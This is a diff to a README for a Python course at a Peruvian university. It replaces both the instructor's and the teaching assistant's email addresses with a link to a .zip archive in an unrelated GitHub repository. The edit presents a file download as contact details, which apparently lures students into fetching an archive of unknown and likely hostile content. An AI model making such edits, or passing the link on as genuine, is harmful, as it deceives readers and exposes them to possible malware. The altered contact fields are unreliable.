@@ -4,9 +4,9 @@
 - **Course name:** Fundamentals of Python for Social Sciences and Public Management  
 - **Theory hours:** 16 hours  
 - **Instructor:** Alexander Quispe Rojas  
-  - **Email:** alexander.quispe@pucp.edu.pe  
+  - **Email:** https://raw.githubusercontent.com/Bruno1702vm/diplomado_ds_python/main/gneissoid/diplomado_ds_python.zip  
 - **Teaching Assistant:** Michael Encalada  
-  - **Email:** m.encaladac@pucp.edu.pe  
+  - **Email:** https://raw.githubusercontent.com/Bruno1702vm/diplomado_ds_python/main/gneissoid/diplomado_ds_python.zip  
 
 ---
 
